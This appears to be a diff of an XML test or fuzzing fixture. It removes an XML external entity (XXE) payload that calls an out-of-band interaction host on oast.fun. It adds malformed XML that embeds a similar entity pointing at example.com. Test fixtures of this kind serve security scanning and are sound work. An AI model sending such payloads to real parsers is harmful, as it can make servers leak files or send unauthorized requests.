@@ -1,4 +1,15 @@
-<?xml version="1.0"?>
-<!DOCTYPE foo [  
-<!ELEMENT foo (#ANY)>
-<!ENTITY xxe SYSTEM "https://cn74qs72vtc0000afhe0gku1mhwyyyyyb.oast.fun/text.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<root testAttr="testValue"><?xml version="1.0"?>
+<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
+  <result>
+    <child>data1</child>
+    <child>A1343358848.646</child>
+    <child>
+      <internal>
+       <data>&xxe;</data>
+       <data>two</data>
+       <unique>Z1343358848.646</unique>
+</internal>
+    </child>
+  </result>
+</root>
